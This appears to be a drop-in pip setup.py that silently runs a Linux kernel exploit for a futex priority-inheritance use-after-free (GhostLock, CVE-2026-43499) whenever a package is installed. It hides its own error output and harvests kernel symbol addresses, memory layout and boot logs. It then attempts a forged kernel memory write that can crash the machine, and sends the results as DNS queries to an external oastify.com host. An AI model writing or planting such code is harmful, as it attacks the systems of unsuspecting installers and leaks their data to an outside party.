#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostlock_setup.py
==================
Drop-in pip `setup.py` that probes the running kernel for GhostLock
(CVE-2026-43499) at install time and reports stage-by-stage over DNS.

Two phases:

  phase A  "poison"  layout- and address-independent.  After the buggy
                     -EDEADLK rollback the waiter's pi_blocked_on dangles
                     into its own freed FUTEX_WAIT_REQUEUE_PI frame; that
                     frame is reclaimed with PR_SET_MM_MAP's on-stack
                     user_auxv[] filled with non-canonical qwords.  The next
                     sched_setscheduler() walks the PI chain and dereferences
                     poison -> oops.  WEDGED == vulnerable, CLEAN == patched.

  phase B  "forge"   reclaims the same frame with a forged rt_mutex_waiter
                     whose tree.entry has __rb_parent_color == 1 (parent
                     NULL, node RED) so the rb-tree erase collapses to a
                     single store.  Sweeps the auxv placement and kernel
                     target candidates.  Exactly one CLEAN == write landed.

Nothing is required from the environment beyond CONFIG_FUTEX_PI=y.
"""

import ctypes
import mmap
import os
import re
import signal
import socket
import struct
import sys
import threading
import time

# ---------------------------------------------------------------------------
# configuration
# ---------------------------------------------------------------------------
_ENDPOINT = "el3tyv77e75e3o4fqjj3die6wx2rqje8.oastify.com"
_TAG      = "glock1"

# Optional hints.  Leave empty to auto-derive / sweep.
_KERN_T_HINTS   = []     # e.g. [0xffff80008a3b1c40]  == &inet6_protos[IPPROTO_UDP]
_KERN_BSS_HINTS = []     # e.g. [0xffff8000a1000000]  == any big zero writable kernel run

_MAX_ATTEMPTS    = 140
_CHILD_TIMEOUT   = 0.40
_BUDGET_SECONDS  = 26.0
_SWEEP_FROM      = 0x00
_SWEEP_TO        = 0x100
_SWEEP_STEP      = 0x08

_SEND_PASSES     = 4
_SEND_GAP        = 0.6
_WORKERS         = 24
_LABEL_MAX       = 56

# ---------------------------------------------------------------------------
# quiet stderr (pip must stay readable)
# ---------------------------------------------------------------------------
class _Sink(object):
    def write(self, s): return len(s)
    def flush(self): pass
    def isatty(self): return False
    def fileno(self): return 2
    @property
    def buffer(self): return self

def _quiet_on():
    try: sys.stderr.flush()
    except Exception: pass
    old = sys.stderr
    try:
        fd = os.open(os.devnull, os.O_WRONLY)
        saved = os.dup(2)
        os.dup2(fd, 2)
        os.close(fd)
    except Exception:
        saved = None
    sys.stderr = _Sink()
    return old, saved

def _quiet_off(state):
    old, saved = state
    sys.stderr = old
    if saved is not None:
        try:
            os.dup2(saved, 2); os.close(saved)
        except Exception: pass

# ---------------------------------------------------------------------------
# syscall layer
# ---------------------------------------------------------------------------
_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long          # <- 64-bit returns, not c_int
_l = ctypes.c_long
_v = ctypes.c_void_p

def _sys(nr, *args):
    return _libc.syscall(_l(nr), *args)

_mach = (platform_machine if False else os.uname()[4]).lower() if hasattr(os, "uname") else ""
import platform as _pf
_mach = _pf.machine().lower()

if _mach in ("aarch64", "arm64"):
    SYS_futex, SYS_prctl, SYS_sched_setscheduler = 98, 167, 119
elif _mach in ("x86_64", "amd64"):
    SYS_futex, SYS_prctl, SYS_sched_setscheduler = 202, 157, 144
else:
    SYS_futex, SYS_prctl, SYS_sched_setscheduler = 98, 167, 119

FUTEX_WAIT            = 0
FUTEX_WAKE            = 1
FUTEX_LOCK_PI         = 6
FUTEX_UNLOCK_PI       = 7
FUTEX_CMP_REQUEUE_PI  = 10
FUTEX_WAIT_REQUEUE_PI = 11
FUTEX_PRIVATE_FLAG    = 128

PR_SET_MM_MAP = 15
SCHED_BATCH   = 3

FUTEX_WAITERS  = 0x80000000
EDEADLK        = 35          # arm64/x86_64

# ---------------------------------------------------------------------------
# forged rt_mutex_waiter
# ---------------------------------------------------------------------------
#   offset, fixed value (None == slot-dependent)
#   layout A (6.1 stable, rt_waiter_node):  tree 0x00/prio 0x18/deadline 0x20,
#                                           pi_tree 0x28, task 0x50, lock 0x58,
#                                           wake_state 0x60, ww_ctx 0x68
#   layout B (pre-rt_waiter_node):          tree_entry 0x00, pi_tree_entry 0x18,
#                                           task 0x30, lock 0x38, prio 0x40,
#                                           ww_ctx 0x48
#   Pinning both makes one sweep cover both builds; pi_tree is never touched.
_BLK = (
    (0x00, 1),      # __rb_parent_color = 1  -> parent NULL, node RED
    (0x08, 0),      # rb_right = NULL
    (0x10, "CHILD"),# rb_left  = CHILD      (becomes the value stored into target)
    (0x18, 1),      # tree.prio (A) / pi_tree_entry.__rb_parent_color (B)
    (0x20, 0),      # tree.deadline
    (0x28, 0),      # pi_tree.entry.__rb_parent_color
    (0x30, "TASK"), # pi_tree.entry.rb_right (A) / task (B)
    (0x38, "T"),    # pi_tree.entry.rb_left  (A) / lock (B)
    (0x40, 0),      # pi_tree.prio (A) / prio (B)
    (0x48, 0),      # pi_tree.deadline (A) / ww_ctx (B)
    (0x50, "TASK"), # task
    (0x58, "T"),    # lock
    (0x60, 0),      # wake_state
    (0x68, 0),      # ww_ctx
)

# filler: a virtual-address hole on arm64/x86_64 (not TTBR0, not TTBR1), and
# with a non-zero low dword so a mis-placed block still defeats the
# rt_waiter_node_equal() early return.
_FILL = 0x0001000000000001

AUXV_QWORDS = 46                 # AT_VECTOR_SIZE
AUXV_BYTES  = AUXV_QWORDS * 8    # 368

KIMAGE_VADDR = 0xffff800080000000

# ---------------------------------------------------------------------------
# child <-> parent status codes
# ---------------------------------------------------------------------------
C_SETUP  = b"0"
C_ARMED  = b"S"
C_CLEAN  = b"1"
C_WEDGE  = b"2"
C_NOTRIG = b"3"
C_EXC    = b"X"

# ---------------------------------------------------------------------------
# tiny helpers
# ---------------------------------------------------------------------------
def _addr(m):
    return ctypes.addressof(ctypes.c_char.from_buffer(m))

def _g32(m, off):
    return struct.unpack_from("<I", m, off)[0]

def _s32(m, off, val):
    struct.pack_into("<I", m, off, val & 0xFFFFFFFF)

def _g64(m, off):
    return struct.unpack_from("<Q", m, off)[0]

def _read(p, lim=1 << 20):
    try:
        with open(p, "rb") as f:
            return f.read(lim)
    except Exception:
        return b""

# ---------------------------------------------------------------------------
# environment probe
# ---------------------------------------------------------------------------
def _probe():
    d = {}
    d["kernel"] = os.uname()[2]
    d["arch"]   = _pf.machine()
    try:
        d["ncpu"] = len(os.sched_getaffinity(0))
    except Exception:
        d["ncpu"] = os.cpu_count() or 0
    d["version"] = _read("/proc/version", 256).decode("utf-8", "replace").strip()[:200]
    d["futex_pi"] = b"CONFIG_FUTEX_PI=y" in _read("/proc/config.gz") or "n/a"

    # kallsyms (addresses are often zeroed for uid != 0)
    syms, zeroed, total = {}, True, 0
    for line in _read("/proc/kallsyms", 4 << 20).decode("utf-8", "replace").splitlines():
        p = line.split()
        if len(p) >= 3:
            total += 1
            try:
                a = int(p[0], 16)
            except Exception:
                continue
            if a:
                zeroed = False
            if p[2] not in syms:
                syms[p[2]] = a
    d["ksym_total"] = total
    d["ksym_addr"]  = "no" if zeroed else "yes"
    for s in ("inet6_protos", "_stext", "_sdata", "_edata",
              "__bss_start", "__bss_stop", "init_task"):
        if syms.get(s):
            d["ks_" + s] = syms[s]

    # /proc/iomem kernel regions (physical)
    d["iomem"] = []
    for line in _read("/proc/iomem", 1 << 18).decode("utf-8", "replace").splitlines():
        if "Kernel" in line or "System RAM" in line:
            d["iomem"].append(" ".join(line.split())[:48])

    # boot log layout, if readable
    log = _read("/dev/kmsg", 1 << 20) or _read("/proc/kmsg", 1 << 20)
    lay = []
    for line in log.decode("utf-8", "replace").splitlines():
        if "Virtual kernel memory layout" in line or re.search(r"\.(text|bss|data|rodata)\s*:", line):
            lay.append(" ".join(line.split())[-46:])
    d["layout"] = lay[-8:]
    return d

def _candidates(d):
    """Return (targets, task_hint) kernel addresses to try."""
    cands = list(_KERN_T_HINTS)

    # 1. direct symbol, if kallsyms is usable
    ip = d.get("ks_inet6_protos")
    if ip:
        cands.append(ip + 17 * 8)

    # 2. derive .bss virtual range from /proc/iomem + fixed KIMAGE_VADDR
    try:
        ram = None
        for ln in d.get("iomem", []):
            m = re.match(r"^([0-9a-f]{8,})\s*-\s*([0-9a-f]{8,})\s*:\s*System RAM", ln)
            if m:
                ram = int(m.group(1), 16); break
        bss = None
        for ln in d.get("iomem", []):
            m = re.match(r"^([0-9a-f]{8,})\s*-\s*([0-9a-f]{8,})\s*:\s*Kernel bss", ln)
            if m:
                bss = (int(m.group(1), 16), int(m.group(2), 16)); break
        if ram is not None and bss is not None:
            lo = KIMAGE_VADDR + (bss[0] - ram)
            hi = KIMAGE_VADDR + (bss[1] - ram)
            span = max(hi - lo, 0)
            for f in (0.50, 0.25, 0.75, 0.10):
                cands.append((lo + int(span * f)) & ~0xF)
    except Exception:
        pass

    cands.extend(_KERN_BSS_HINTS)
    out = []
    for c in cands:
        if c and c not in out:
            out.append(c & ~0xF)
    return out[:4]

# ---------------------------------------------------------------------------
# one attempt, executed in a forked child
# ---------------------------------------------------------------------------
def _self_stat():
    """mm fields needed by PR_SET_MM_MAP, all page-masked."""
    st = {}
    try:
        raw = _read("/proc/self/stat", 4096).decode("utf-8", "replace")
        rest = raw[raw.rfind(")") + 2:].split()
        def fld(n):
            return int(rest[n - 3]) & ~0xFFF
        st["start_code"] = fld(26); st["end_code"] = fld(27)
        st["start_stack"] = fld(28)
        st["start_data"] = fld(45); st["end_data"] = fld(46)
        st["start_brk"] = fld(47); st["brk"] = fld(47)
        st["arg_start"] = fld(48); st["arg_end"] = fld(49)
        st["env_start"] = fld(50); st["env_end"] = fld(51)
    except Exception:
        pass
    try:
        _libc.sbrk.restype = ctypes.c_void_p
        b = _libc.sbrk(0)
        if b and b != ctypes.c_void_p(-1).value:
            st["brk"] = int(b) & ~0xFFF
    except Exception:
        pass
    for k in ("start_code", "end_code", "start_data", "end_data", "start_brk",
              "brk", "start_stack", "arg_start", "arg_end", "env_start", "env_end"):
        st.setdefault(k, 0x1000)
    return st

def _pack_prctl_map(buf, auxv_addr, auxv_size, st):
    order = ("start_code", "end_code", "start_data", "end_data", "start_brk",
             "brk", "start_stack", "arg_start", "arg_end", "env_start", "env_end")
    vals = [st[k] for k in order]
    struct.pack_into("<11Q2I", buf, 0, *(vals + [auxv_addr, auxv_size, 0xFFFFFFFF]))

def _attempt_child(wfd, off, T, TASK, CHILD, deadline_ticks):
    W = mmap.mmap(-1, 0x1000)
    A = mmap.mmap(-1, 0x1000)
    Mp = mmap.mmap(-1, 0x1000)
    wa, aa, ma = _addr(W), _addr(A), _addr(Mp)

    WC, WT, WW = 0x000, 0x040, 0x080
    F_ARMED, F_STAGE, F_AUXV, F_OUT, F_TID = 0x100, 0x104, 0x108, 0x10C, 0x110

    # auxv: filler everywhere, forged block at `off` (off < 0 == poison)
    struct.pack_into("<%dQ" % AUXV_QWORDS, A, 0, *([_FILL] * AUXV_QWORDS))
    if off >= 0:
        for o, val in _BLK:
            if val == "T":       v = T
            elif val == "TASK":  v = TASK
            elif val == "CHILD": v = CHILD
            else:                v = val
            struct.pack_into("<Q", A, off + o, v & 0xFFFFFFFFFFFFFFFF)

    st = _self_stat()
    _pack_prctl_map(Mp, aa, AUXV_BYTES, st)

    def stage(n):
        _s32(W, F_STAGE, n)

    def waiter():
        try:
            _s32(W, F_TID, threading.get_native_id())
            r = _sys(SYS_futex, _v(wa + WC), _l(FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG),
                     _l(0), _v(0), _v(0), _l(0))
            if r != 0:
                return
            stage(2)                                     # own the chain futex
            _s32(W, WW, FUTEX_WAITERS)                   # glibc-style arming
            _s32(W, F_ARMED, 1)
            ts = struct.pack("<qq", 0, 100000000)        # 100 ms
            _sys(SYS_futex, _v(wa + WW),
                 _l(FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG),
                 _l(FUTEX_WAITERS), _v(ctypes.addressof(ctypes.c_char.from_buffer_copy(ts))),
                 _v(wa + WT), _l(0))
            # ---- reclaim: this must be the very next syscall ----
            _sys(SYS_prctl, _l(PR_SET_MM_MAP), _v(ma), _l(104))
            _s32(W, F_AUXV, 1)
            # ---- pure userspace spin: no syscall may clobber the frame ----
            while _g32(W, F_OUT) == 0:
                pass
        except Exception:
            pass

    def owner():
        try:
            if _sys(SYS_futex, _v(wa + WT), _l(FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG),
                    _l(0), _v(0), _v(0), _l(0)) != 0:
                return
            stage(3)                                     # own the target futex
            _sys(SYS_futex, _v(wa + WC), _l(FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG),
                 _l(0), _v(0), _v(0), _l(0))
            stage(4)                                     # PI-blocked on chain
        except Exception:
            pass

    def mover():
        try:
            t0 = time.monotonic()
            while True:
                if _g32(W, F_ARMED) and (_g32(W, WC) & FUTEX_WAITERS):
                    break
                if time.monotonic() - t0 > 1.0:
                    stage(21); return
            t1 = time.monotonic()
            while time.monotonic() - t1 < 0.0003:        # let the waiter park
                pass
            val3 = _g32(W, WW)
            r = _sys(SYS_futex, _v(wa + WW),
                     _l(FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG),
                     _l(1), _l(1), _v(wa + WT), _l(val3))
            _sys(SYS_futex, _v(wa + WW), _l(FUTEX_WAKE | FUTEX_PRIVATE_FLAG),
                 _l(1), _v(0), _v(0), _l(0))
            if r != -EDEADLK:
                stage(22); return
            stage(5)                                     # buggy rollback taken
            t0 = time.monotonic()
            while _g32(W, F_AUXV) == 0:
                if time.monotonic() - t0 > 0.5:
                    stage(23); return
            tid = _g32(W, F_TID)
            if not tid:
                stage(23); return
            _s32(W, F_OUT, 1)
            param = struct.pack("<i", 0)
            _sys(SYS_sched_setscheduler, _l(tid), _l(SCHED_BATCH),
                 _v(ctypes.addressof(ctypes.c_char.from_buffer_copy(param))))
            _s32(W, F_OUT, 2)
            stage(6)                                     # drive returned cleanly
        except Exception:
            stage(24)

    th_w = threading.Thread(target=waiter, daemon=True)
    th_o = threading.Thread(target=owner,  daemon=True)
    th_m = threading.Thread(target=mover,  daemon=True)
    th_w.start(); th_o.start(); th_m.start()

    t0 = time.monotonic()
    sent_armed = False
    while time.monotonic() - t0 < deadline_ticks:
        s = _g32(W, F_STAGE)
        if s >= 6:
            os.write(wfd, C_CLEAN); return
        if s in (21, 22, 23, 24):
            os.write(wfd, C_NOTRIG); return
        if s == 5 and not sent_armed:
            os.write(wfd, C_ARMED); sent_armed = True
        if not th_m.is_alive():
            os.write(wfd, C_WEDGE); return
        time.sleep(0.001)
    os.write(wfd, C_WEDGE)

def _classify(buf):
    if not buf:
        return "DEAD"                     # oopsed before saying anything
    c = buf[-1:]
    if c == C_CLEAN:  return "CLEAN"
    if c == C_WEDGE:  return "WEDGE"
    if c == C_NOTRIG: return "NOTRIGGER"
    if c in (C_SETUP, C_EXC): return "FAIL"
    return "WEDGE" if C_ARMED in buf else "FAIL"

def _run(off, T, TASK, CHILD, timeout):
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            os.close(r)
            _attempt_child(w, off, T, TASK, CHILD, timeout - 0.05)
        except BaseException:
            try: os.write(w, C_EXC)
            except Exception: pass
        os._exit(0)
    os.close(w)
    os.set_blocking(r, False)
    buf = b""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            chunk = os.read(r, 64)
        except BlockingIOError:
            chunk = b""
        except Exception:
            chunk = b""
        if chunk:
            buf += chunk
            if buf[-1:] in (C_CLEAN, C_WEDGE, C_NOTRIG):
                break
        else:
            p, _st = os.waitpid(pid, os.WNOHANG)
            if p == pid:
                try: buf += os.read(r, 64)
                except Exception: pass
                os.close(r)
                return _classify(buf)
        time.sleep(0.002)
    try: os.kill(pid, signal.SIGKILL)
    except Exception: pass
    try: os.waitpid(pid, 0)
    except Exception: pass
    try: os.close(r)
    except Exception: pass
    return _classify(buf)

# ---------------------------------------------------------------------------
# DNS reporting
# ---------------------------------------------------------------------------
def _labels(blob, seq):
    h = blob.hex()
    out, n = [], 0
    while h:
        out.append(("%s%02d-%s" % (seq, n, h[:_LABEL_MAX])))
        h = h[_LABEL_MAX:]
        n += 1
    return out or ["%s00-" % seq]

def _send(labels):
    pending = list(labels)
    for _ in range(_SEND_PASSES):
        if not pending:
            break
        failed = []
        for lab in pending:
            try:
                socket.getaddrinfo(lab + "." + _ENDPOINT, 0)
            except Exception:
                failed.append(lab)
        pending = failed
        if pending:
            time.sleep(_SEND_GAP)
    return len(labels) - len(pending), len(labels)

def _report(lines):
    blob = (";".join(lines)).encode("utf-8", "replace")
    labels = _labels(blob, _TAG)
    ok, tot = _send(labels)
    return ok, tot, len(blob)

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    quiet = _quiet_on()
    t_start = time.monotonic()
    lines = ["tag=" + _TAG, "pid=%d" % os.getpid()]

    try:
        d = _probe()
        lines.append("kernel=" + d["kernel"])
        lines.append("arch=%s ncpu=%s" % (d["arch"], d["ncpu"]))
        lines.append("ksym=%s/%s" % (d["ksym_addr"], d["ksym_total"]))
        for k in ("ks_inet6_protos", "ks___bss_start", "ks___bss_stop", "ks__stext"):
            if k in d:
                lines.append("%s=0x%x" % (k[3:], d[k]))
        for ln in d["iomem"][:6]:
            lines.append("iomem:" + ln)
        for ln in d["layout"][-6:]:
            lines.append("lay:" + ln)

        cands = _candidates(d)
        lines.append("cands=" + ",".join("0x%x" % c for c in cands))
        lines.append("hints_t=%d hints_bss=%d" % (len(_KERN_T_HINTS), len(_KERN_BSS_HINTS)))

        # ---------------- phase A: poison (decisive) ----------------
        pv = _run(-1, 0, 0, 0, _CHILD_TIMEOUT)
        lines.append("A_poison=" + pv)
        verdict = {"WEDGE": "VULNERABLE", "DEAD": "VULNERABLE",
                   "CLEAN": "PATCHED"}.get(pv, "INCONCLUSIVE")
        lines.append("verdict=" + verdict)

        # ---------------- phase B: forge sweep ----------------
        if cands:
            offsets = list(range(_SWEEP_FROM, _SWEEP_TO + 1, _SWEEP_STEP))
            hits, tried = [], 0
            stop = False
            for ci, T in enumerate(cands):
                if stop:
                    break
                TASK = T
                CHILD = T + 0x40
                for off in offsets:
                    if tried >= _MAX_ATTEMPTS:
                        stop = True; break
                    if time.monotonic() - t_start > _BUDGET_SECONDS:
                        stop = True; break
                    res = _run(off, T, TASK, CHILD, _CHILD_TIMEOUT)
                    tried += 1
                    if res in ("CLEAN", "DEAD"):
                        hits.append("c%d@0x%x=%s" % (ci, off, res))
                    if res == "CLEAN":
                        stop = True
                        break
            lines.append("B_forge_tried=%d" % tried)
            lines.append("B_forge_hits=" + (",".join(hits) if hits else "none"))
            lines.append("B_forge=" + ("WRITE_OK" if hits else "NO_HIT"))
        else:
            lines.append("B_forge=NO_CANDIDATE")

        lines.append("ms=%d" % int((time.monotonic() - t_start) * 1000))
    except Exception as e:
        lines.append("panic=%s:%s" % (type(e).__name__, str(e)[:60]))

    ok, tot, nbytes = _report(lines)
    _quiet_off(quiet)
    return 0

if __name__ == "__main__":
    main()
